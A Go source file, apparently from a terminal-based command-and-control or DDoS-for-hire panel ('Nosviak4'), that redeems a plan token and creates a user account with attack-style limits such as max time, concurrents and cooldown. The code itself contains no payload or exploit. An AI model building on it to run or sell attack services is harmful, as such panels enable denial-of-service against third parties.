package masters

import (
	"Nosviak4/modules/gologr"
	"Nosviak4/source"
	"Nosviak4/source/database"
	"Nosviak4/source/masters/commands"
	"Nosviak4/source/masters/terminal"
	"context"
	"time"
)

// redeem wil handle whenever the session types `redeem` on the login page
func redeem(terminal *terminal.Terminal, ctx context.Context) error {
	if err := terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "banner.tfx"); err != nil {
		return err
	}

	prompt, err := terminal.ExecuteBrandingToString(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "redeem.tfx")
	if err != nil {
		return err
	}

	content, err := terminal.NewReadWithContext(prompt, ctx).ReadLine()
	if err != nil || len(content) == 0 {
		return err
	}

	// once we've gotten the token they have, we'll check if it's not been claimed.
	token, err := database.DB.GetToken(string(content))
	if err != nil || token.Owner >= 1 {
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "code_not_found.tfx")
	}

	// checks if the token has expired
	if token.Expiry > 0 && token.Created + token.Expiry <= time.Now().Unix() {
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "token_expired.tfx")
	}

	// we also check if the plan the token was created with still exists.
	plan, ok := source.Presets[token.Plan]
	if !ok || plan == nil {
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "code_not_found.tfx")
	}

	// finds the user who created the token
	parent, err := database.DB.GetUserWithID(token.Parent)
	if err != nil || parent == nil {
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "code_not_found.tfx")
	}

	if err := terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "user_banner.tfx"); err != nil {
		return err
	}

	username_prompt, err := terminal.ExecuteBrandingToString(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "username.tfx")
	if err != nil {
		return err
	}

	username, err := terminal.NewReadWithContext(username_prompt, ctx).ChangeMaxLen(source.OPTIONS.Ints("maximum_user_length")).ChangeMinLen(source.OPTIONS.Ints("minimum_user_length")).ReadLine()
	if err != nil || len(username) == 0 {
		return err
	}

	password_prompt, err := terminal.ExecuteBrandingToString(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "password.tfx")
	if err != nil {
		return err
	}

	password, err := terminal.NewReadWithContext(password_prompt, ctx).ChangeMaxLen(source.OPTIONS.Ints("maximum_password_length")).ChangeMinLen(source.OPTIONS.Ints("minimum_password_length")).ReadLine()
	if err != nil || len(password) == 0 {
		return err
	}

	// checks if the user already exists, if so we return an error
	if user, err := database.DB.GetUser(string(username)); user != nil && err == nil {
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "user_already_exists.tfx")
	}

	user := &database.User{
		Username: string(username), 
		Password: password, 
		API: false, 
		Roles: plan.Roles, 
		Theme: plan.Theme, 
		NewUser: true, 
		Maxtime: plan.Maxtime, 
		Conns: plan.Concurrents, 
		Cooldown: plan.Cooldown, 
		Expiry: int64(plan.Days) * 86400, 
		Sessions: source.OPTIONS.Ints("default_user", "max_sessions"),
	}

	// tries to create the user with the details provided
	if err := database.DB.NewUser(user, parent, commands.Conn.SendWebhook); err != nil {
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "error_creating.tfx")
	}
	
	// once we've created the user, we almost instantly try fetch it to find the ip allocated
	user, err = database.DB.GetUser(user.Username)
	if err != nil || user == nil {
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "error_creating.tfx")
	}

	if err := database.DB.ClaimToken(token, user); err != nil {
		source.LOGGER.AggregateTerminal().WriteLog(gologr.ERROR, "Account created, token not deleted: %v", err)
		return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "error_creating.tfx")
	}

	return terminal.ExecuteBranding(make(map[string]any), source.ASSETS, source.BRANDING, "login", "redeem", "redeemed.tfx")
}
